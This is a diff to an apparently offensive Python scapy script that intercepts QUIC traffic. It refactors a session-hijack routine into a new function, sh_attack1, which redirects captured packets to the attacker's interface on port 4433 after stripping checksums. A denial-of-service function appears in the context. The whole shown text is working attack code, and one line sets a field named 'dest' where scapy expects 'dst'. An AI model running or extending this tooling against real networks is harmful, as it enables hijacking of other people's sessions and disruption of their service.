@@ -1,7 +1,7 @@
 import os, signal
 import argparse
 
-from scapy.all import sniff, send, bind_layers, UDP, get_if_hwaddr, Ether
+from scapy.all import sniff, send, bind_layers, UDP, get_if_hwaddr, Ether, IP
 
 
 #from scapy.layers.quic import *
@@ -49,6 +49,14 @@ def dos_attack(victim, version = QuicProtocolVersion.VERSION_1):
     else:
         send(forged, iface=inner_iface, verbose=False)
 
+def sh_attack1(pkt):
+    new_pkt = pkt[IP]
+    new_pkt[IP].dest = attacker_inner_iface_ip
+    new_pkt[UDP].dport = 4433
+    del new_pkt.getlayer(IP).chksum
+    del new_pkt.getlayer(UDP).chksum
+    #print(f"New PKT to server: {new_pkt.summary()}")
+    send(new_pkt, iface=inner_iface, verbose=False)
 
 def handle_quic(pkt):
     global vs
@@ -64,16 +72,9 @@ def handle_quic(pkt):
                 if (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                     dos_attack(pkt, QuicProtocolVersion(pkt[QUIC_Initial].Version))
                     return
-                elif (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
-                    new_pkt = pkt[IP]
-                    new_pkt[IP].dest = attacker_inner_iface_ip
-                    new_pkt[UDP].dport = 4433
-                    del new_pkt.getlayer(IP).chksum
-                    del new_pkt.getlayer(UDP).chksum
-                    #print(f"New PKT to server: {new_pkt.summary()}")
-                    send(new_pkt, iface=inner_iface, verbose=False)
-                    print("Sent shit")
-                    return
+            if QUIC in pkt and (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
+                sh_attack1(pkt)
+                print("Sent shit")
             add_and_send_to_server(pkt)
             
             
